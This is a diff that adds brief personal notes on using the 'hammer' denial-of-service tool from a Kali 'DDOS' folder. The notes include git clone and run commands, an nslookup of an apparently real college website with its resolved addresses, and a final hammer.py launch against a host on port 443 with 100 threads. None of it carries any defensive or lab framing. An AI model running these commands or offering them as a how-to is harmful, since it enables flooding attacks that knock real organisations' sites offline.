@@ -1,0 +1,44 @@
+hammer tool
+
+
+https://github.com/cyweb/hammer
+
+
+=========================================================
+downloads && installations :
+==========================================================
+
+ git clone https://github.com/cyweb/hammer.git
+ 
+ cd hammer
+ 
+ python3 hammer.py 
+ (help)
+ 
+ nslookup aaaenggcoll.com  
+ 
+ (root㉿kali)-[/home/kali/Desktop/DDOS/hammer]
+└─# nslookup aaaenggcoll.ac.in
+
+
+
+Server:         192.168.88.2
+Address:        192.168.88.2#53
+
+Non-authoritative answer:
+Name:   aaaenggcoll.ac.in
+Address: 172.67.222.233
+Name:   aaaenggcoll.ac.in
+Address: 104.21.46.27
+Name:   aaaenggcoll.ac.in
+Address: 2606:4700:3034::6815:2e1b
+Name:   aaaenggcoll.ac.in
+Address: 2606:4700:3036::ac43:dee9
+
+
+==========================================================
+===========================================================
+==========================================================
+
+python3 hammer.py -s 192.168.88.142 -p 443 -t 100
+
